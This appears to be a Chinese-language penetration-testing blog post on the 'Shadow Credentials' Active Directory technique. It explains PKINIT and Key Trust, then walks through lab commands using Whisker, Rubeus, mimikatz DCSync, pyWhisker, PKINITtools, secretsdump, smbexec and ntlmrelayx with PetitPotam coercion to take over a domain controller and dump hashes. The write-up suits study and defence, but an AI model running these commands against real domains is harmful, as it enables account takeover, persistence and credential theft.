---
title: Shadow Credentials
date: 2022-04-27 16:25:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Active Directory", "Domain Persistence", "PKINIT", "ADCS", "Smart Card"]
layout: post
---

在 [Black Hat Europe 2019](https://www.dsinternals.com/wp-content/uploads/eu-19-Grafnetter-Exploiting-Windows-Hello-for-Business.pdf) 大会期间，Michael Grafnetter（[@MGrafnetter](https://twitter.com/MGrafnetter)）讨论了针对 Windows Hello for Business 技术的多种攻击方法，其中包括域持久化技术。该技术涉及修改目标计算机账户或用户帐户的 `msDS-KeyCredentialLink` 属性，以获得用于检索 NTLM 哈希值和请求 TGT 票据。即使目标帐户的密码被修改后，该属性也不会受到影响，因此，攻击者可以使用该技术完美的实现域持久性。



## TL;DR

Will Schroeder（[@harmj0y](https://twitter.com/harmj0y)）和 Lee Christensen（[@tifkin_](https://twitter.com/tifkin_)）在 2021 年发表了关于 AD CS 攻击的[白皮书](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)，文章中介绍了 Kerberos 使用公钥加密进行初始身份验证（PKINIT）的其他技术，这使得 Elad Shamir（[@elad_shamir](https://twitter.com/elad_shamir)）重新发现了一种用于客户端对象接管的替代技术。

在此之前，Michael Grafnetter 已经发现了这种滥用技术，并在 [Black Hat Europe 2019](https://www.dsinternals.com/wp-content/uploads/eu-19-Grafnetter-Exploiting-Windows-Hello-for-Business.pdf) 上展示了它。Michael 在他的演讲中清楚地展示了这种滥用行为，并解释了关于 WHfB 和 Key Trust 模型的一些内部工作原理。

Michael 还一直在维护一个名为 [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) 的库，它在现实中支持了这种机制的滥用。Elad Shamir 将 Michael 的一些代码移植到了一个名为 [Whisker](https://github.com/eladshamir/Whisker) 的新 C# 工具中，以便通过操作植入来使用。

## What is PKINIT?

PKINIT 是 Kerberos 协议的扩展协议，允许在身份验证阶段使用数字证书。这种技术可以用智能卡或 USB 类型的身份验证代替基于密码的身份验证。PKINIT 协议允许在 Kerberos 协议的初始（预）身份验证交换中使用公钥加密，通过使用公钥加密来保护初始身份验证，Kerberos 协议得到了显着增强，并且可以与现有的公钥身份验证机制（例如智能卡）一起使用。

在传统的 Kerberos 身份验证中，客户端必须在 KDC 为其提 TGT 票据之前执行 “预身份验证”，该票证随后可用于获取服务票证。客户端使用其凭据加密时间戳来执行预身份验证，以向 KDC 证明他们拥有该帐户的凭据。使用时间戳而不是静态值有助于防止重放攻击。

对称密钥方法是使用最广泛和已知的一种方法，它使用从客户端密码派生的对称密钥（AKA 密钥）。如果使用 RC4 加密，此密钥将是客户端密码的哈希值。KDC 拥有客户端密钥的副本，并且可以解密预身份验证的数据以对客户端进行认证。KDC 使用相同的密钥来加密与 TGT 一起发送给客户端的会话密钥。

![](/assets/posts/2022-04-27-shadow-credentials/image-20220428091302031.png)

PKINIT 是不太常见的非对称密钥方法。客户端有一个公/私密钥对，并用他们的私钥对预验证数据进行加密，KDC 用客户端的公钥对其进行解密。KDC 还有一个公/私密钥对，允许使用以下两种方法之一交换会话密钥：

1. **Diffie-Hellman Key Delivery**

   该方法允许 KDC 和客户端安全地建立共享会话密钥，即使攻击者拥有客户端或 KDC 的私钥。会话密钥将存储在 TGT 的加密部分，它是用 Krbtgt 帐户的密钥（哈希）加密的。

2. **Public Key Encryption Key Delivery**

   该方法使用 KDC 的私钥和客户端的公钥来封装由 KDC 生成的会话密钥。

传统上，公钥基础设施（PKI）允许 KDC 和客户端使用由双方先前已与证书颁发机构（CA）建立信任的实体签署的数字证书以交换他们的公钥。这是证书信任（Certificate Trust）模型，最常用于智能卡身份验证。

![](/assets/posts/2022-04-27-shadow-credentials/image-20220428092740053.png)

## No PKI? No Problem!

Microsoft 还引入了密钥信任（Key Trust）的概念，以在不支持 Certificate Trust 的环境中支持无密码身份验证。在 Key Trust 模型下，PKINIT 身份验证是基于原始密钥数据而不是证书建立的。

客户端的公钥存储在一个名为 `msDS-KeyCredentialLink` 的多值属性中，该属性在 Windows Server 2016 中引入。该属性的值是 Key Credentials，它是包含创建日期、所有者可分辨名称等信息的序列化对象，一个代表设备 ID 的 GUID，当然还有公钥。

![](/assets/posts/2022-04-27-shadow-credentials/image-20220428092744784.png)

这种信任模型消除了使用无密码身份验证必须为每个人颁发客户端证书的需要。但是，域控制器仍需要用于会话密钥交换的证书。

这意味着如果我们可以写入用户的 `msDS-KeyCredentialLink` 属性，那么就可以获得该用户的 TGT。

## Windows Hello for Business Provisioning and Authentication

Microsoft 推出了 Windows Hello 企业版（WHfB），用基于密钥的信任模型取代了传统的基于密码的身份验证。当用户注册时，TPM 会为用户的帐户生成一个公/私钥对。接下来，如果在组织中实施了 Certificate Trust 模型，则客户端发出证书注册请求，以从证书颁发机构为 TPM 生成的密钥对获取受信任的证书。但是，如果实施 Key Trust 模型，则公钥将存储在帐户的 `msDS-KeyCredentialLink` 属性的新 `Key Credential` 对象中。私钥受 PIN 码保护，Windows Hello 允许将其替换为生物特征的身份验证因素，例如指纹或面部识别。

当客户端登录时，Windows 会尝试使用其私钥执行 PKINIT 身份验证。在 Key Trust 模型下，域控制器可以使用存储在客户端 `msDS-KeyCredentialLink` 属性中的原始公钥解密其预身份验证数据。在 Certificate Trust 模型下，域控制器将验证客户端证书的信任链，然后使用其中的公钥。一旦预认证成功，域控制器可以通过 Diffie-Hellman Key Delivery 或 Public Key Encryption Key Delivery 交换会话密钥。

## Abuse

在滥用 Key Trust 时，我们实际上是在向目标帐户添加替代凭据，或 “影子凭据”，从而允许获取 TGT 并用于后续操作。即使用户/计算机更改了密码，这些影子凭据也会保留。

Elad Shamir 发布了一个名为 [Whisker](https://github.com/eladshamir/Whisker) 的工具，可以帮助测试人员利用这种技术。该工具将生成证书和 Key Credential，并将 Key Credential 信息存储在 `msDS-KeyCredentialLink` 属性中。生成的证书可以与 Rubeus 一起使用，以请求 TGT 票据并进一步扩大攻击。

该技术需要以下要求：

- 一个系统版本至少为 Windows Server 2016 的域控制器。
- 安装在域控制器上的服务器身份验证数字证书。
- 拥有写入目标对象 `msDS-KeyCredentialLink` 属性的权限的帐户。

以下账户拥有 `msDS-KeyCredentialLink` 属性的写入权限：

- 域管理员账户
- Key Admins 组中的账户
- Enterprise Key Admins 组中的账户
- 对 Active Directory 中的对象具有 GenericAll 或 GenericWrite 权限的帐户
- 机器账户对自身的 `msDS-KeyCredentialLink` 属性拥有写入权限

（1）执行以下命令，通过 Whisker 的 `add` 命令向域控制器的 `msDS-KeyCredentialLink` 属性添加 Shadow Credentials 

```console
C:\Users\Marcus\Desktop> Whisker.exe add /target:DC01$ /domain:pentest.com /dc:DC01.pentest.com
```

![](/assets/posts/2022-04-27-shadow-credentials/image-20220427135940527.png)

通过 `list` 命令可以列出目标对象的 `msDS-KeyCredentialLink` 属性的所有条目，如下图所示。

```console
C:\Users\Marcus\Desktop> Whisker.exe list /target:DC01$ /domain:pentest.com /dc:DC01.pentest.com
```

![](/assets/posts/2022-04-27-shadow-credentials/image-20220427140123948.png)

（2）Whisker  `add` 命令的输出中提供了 Rubeus 命令，使用该命令可以使用基于证书的身份验证请求 TGT 票据。这里我们在 Whisker 提供的 Rubeus 命令后面加上了 `/ptt`，以将请求到的 TGT 传递到内存中。

```console
C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:DC01$ /certificate:<Base64Certificate> /password:"AYOjT1jNMyrxNAss" /domain:pentest.com /dc:DC01.pentest.com /getcredentials /show /ptt
```

![](/assets/posts/2022-04-27-shadow-credentials/image-20220427142210115.png)

执行 `klist` 命令可以看到，当前机器中已经缓存了域控制器的 TGT 票据，如下图所示。

![](/assets/posts/2022-04-27-shadow-credentials/image-20220427142429793.png)

由于域控制器账户拥有所需特权，我们可以通过 Mimikatz 执行 DCSync 来导出域用户哈希，如下图所示。

```console
C:\Users\Marcus\Desktop> mimikatz.exe "lsadump::dcsync /domain:pentest.com /user:PENTEST\Administrator" exit
```

![](/assets/posts/2022-04-27-shadow-credentials/image-20220427142500059.png)

此外，我们可以通过 Kerberos 的 S4U2Self 扩展协议，使用已获取的域控 TGT 为域管理员用户申请针对域控上其他服务的的 ST 票据。这里我们请求的是域控制器的 CIFS 服务，相关命令如下：

```console
C:\Users\Marcus\Desktop> Rubeus.exe s4u /self /impersonateuser:PENTEST\Administrator /altservice:CIFS/DC01.pentest.com /dc:DC01.pentest.com /ptt /ticket:<Base64EncodedTicket>
```

![](/assets/posts/2022-04-27-shadow-credentials/image-20220427142657658.png)

执行 `klist` 命令可以看到，当前机器中已经缓存了域管理员的 TGT 票据，该票据可以用来访问域控制器的 CIFS 服务，如下图所示。

![](/assets/posts/2022-04-27-shadow-credentials/image-20220427142717172.png)

此时，我们可以使用标准用户帐户远程访问域控制器的共享资源，如下图所示：

![](/assets/posts/2022-04-27-shadow-credentials/image-20220427142734492.png)

如果想要删除添加到目标对象 `msDS-KeyCredentialLink` 属性的密钥凭据，可以执行以下命令。

```console
C:\Users\Marcus\Desktop> Whisker.exe remove /target:DC01$ /deviceid:<DeviceID>
```

## pyWhisker

如果拥有所需权限的帐户的凭据已知，则该技术也可以从未加入域的系统执行。Charlie Bromberg（[@_nwodtuhs](https://twitter.com/_nwodtuhs)）通过 Python 实现了 Whisker ，共发布了名为 [pyWhisker](https://github.com/ShutdownRepo/pywhisker) 的工具，以实现在未连接到域网络的主机上操作。

（1）执行以下命令，对域控制器账户执行攻击，生成的证书将以 .pfx 格式保存在本地，如下图所示。

```bash
python3 pywhisker.py -d "pentest.com" -u "Marcus" -p "Marcus@123" --target "DC01$" --action "add" --filename dc01
```

![](/assets/posts/2022-04-27-shadow-credentials/image-20220427144154732.png)

（2）pyWhisker 得到的证书可以与 Dirk-jan Mollema（[@dirkjanm](https://twitter.com/_dirkjan)）的 [PKINITtools](https://github.com/dirkjanm/PKINITtools) 一起使用，以通过 KDC 进行身份验证，并请求以 .ccache 格式保存的 TGT 票据，如下图所示。

```bash
python3 gettgtpkinit.py -cert-pfx dc01.pfx -pfx-pass sR68YYFbN6WQIkdBxrol pentest.com/dc01\$ dc01.ccache
```

![](/assets/posts/2022-04-27-shadow-credentials/image-20220427144427355.png)

（3）由于域控制器账户拥有所需特权，我们可以设置环境变量 `KRB5CCNAME`，通过 [Impacket](https://github.com/SecureAuthCorp/impacket) 套件中的 secretsdump.py 使用该票据，并执行 DCSync 来导出域用户哈希，如下图所示。

```bash
export KRB5CCNAME=/root/PKINITtools/dc01.ccache
python3 secretsdump.py -k pentest.com/dc01\$@dc01.pentest.com -no-pass -just-dc
```

![](/assets/posts/2022-04-27-shadow-credentials/image-20220427144809803.png)

（4）此外，我们可以通过 Kerberos 的 S4U2Self 扩展协议，使用已获取的域控 TGT 为域管理员用户申请针对域控上其他服务的的 ST 票据。这里我们请求的是域控制器的 CIFS 服务，相关命令如下：

```bash
python3 gets4uticket.py kerberos+ccache://pentest.com\\dc01\$:dc01.ccache@dc01.pentest.com cifs/dc01.pentest.com@pentest.com Administrator@pentest.com Administrator.ccache -v
```

![](/assets/posts/2022-04-27-shadow-credentials/image-20220427144954906.png)

（5）最后，我们通过设置环境变量 `KRB5CCNAME` 来使用 Administrator 用户的票据，并通过 smbexec.py 获取域控制器的最高权限，相关命令如下。

```bash
export KRB5CCNAME=/root/PKINITtools/Administrator.ccache
python3 smbexec.py -k pentest.com/Administrator@dc01.pentest.com -no-pass
```

![](/assets/posts/2022-04-27-shadow-credentials/image-20220427145108108.png)
## Coerced Authentication

影子凭证技术也已由 Charlie Bromberg（[@_nwodtuhs](https://twitter.com/_nwodtuhs)）实现到了 Impacket 套件的 ntlmrelayx.py 脚本中。攻击可以与 [PetitPotam](https://github.com/topotam/PetitPotam)、[printerbug](https://github.com/leechristensen/SpoolSample) 或 [ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce) 等强制身份验证结合使用，通过 NTLM Relay To LDAP/LDAPs 来为客户端设置 `msDS-KeyCredentialLink`。

但需要注意的是，使用强制身份验证方法执行该技术有一个限制。因为将身份验证从 SMB 中继到 LDAP 将自动触发 LDAP 签名。因此，一种方法是通过 HTTP 等替代协议中继身份验证，另一种是借助 CVE-2019-1040 漏洞（`--remove-mic`）来消除签名的限制，这里我们采用后者。

此外，如果我们要为域控制器账户设置 `msDS-KeyCredentialLink`，我们不能强制域控制器发起认证请求，再将该请求直接中继回域控自身。因为微软早在 KB957097 补丁中，就通过修改 SMB 身份验证答复的验证方式，防止了同一机器从 SMB 协议到 SMB 协议的中继。因此，在这里我们将 `--shadow-target` 的目标设为了另一台域内主机  `WIN2016-WEB1$`，如下图所示。

```bash
python3 ntlmrelayx.py -t ldap://dc01.pentest.com --remove-mic --shadow-credentials --shadow-target win2016-web1\$
```

![](/assets/posts/2022-04-27-shadow-credentials/image-20220503161924169.png)

然后通过 PetitPotam 强制 `WIN2016-WEB1$` 对攻击机发起 NTLM 认证，如下图所示。

```bash
python3 PetitPotam.py -d pentest.com -u marcus -p Marcus\@123 172.26.10.134 win2016-web1.pentest.com
```

![](/assets/posts/2022-04-27-shadow-credentials/image-20220503162109978.png)

Ntlmrelayx.py 会负责将 `WIN2016-WEB1$` 机器账户的认证请求中继到域控制器上的 LDAP，然后为 `WIN2016-WEB1$` 账户添加 `msDS-KeyCredentialLink`。攻击成功后，ntlmrelayx.py 将给出后续 PKINITtools 的利用命令，如下图所示。

![](/assets/posts/2022-04-27-shadow-credentials/image-20220503162506937.png)

## What About NTLM?

PKINIT 允许 WHfB 用户或更传统的智能卡用户执行 Kerberos 身份验证并获得 TGT。但是，如果他们访问需要 NTLM 身份验证的资源该怎么办呢？为了解决这个问题，Microsoft 在 MS-PKCA（Microsoft 的 Kerberos PKINIT 技术规范）的 “1.4 Relationship to Other Protocols” 部分中指出：

> *“In order to support NTLM authentication [MS-NLMP] for applications connecting to network services that do not support Kerberos authentication, when PKCA is used, the KDC returns the user’s NTLM one-way function (OWF) in the privilege attribute certificate (PAC) PAC_CREDENTIAL_INFO buffer”*

也就是说，当进行 Kerberos PKINIT 身份验证的时候，返回的票据的 PAC 里面包含用户的 NTLM 凭据。获取这个 NTLM 凭据涉及解密 PAC_CREDENTIAL_DATA 结构，Benjamin Delpy 早在 2016 年就已经在 Kekeo 和 Mimikatz 中实现了这一点。相关细节请参考我之前的博客 [*Attack Surface Mining For AD CS*](https://whoamianony.top/posts/attack-surface-mining-for-ad-cs/) 中的 “0.4.5 NTLM Credential Theft via PKINIT – THEFT5” 部分。

## Ending......

参考文献：

> https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
>
> https://pentestlab.blog/2022/02/07/shadow-credentials/
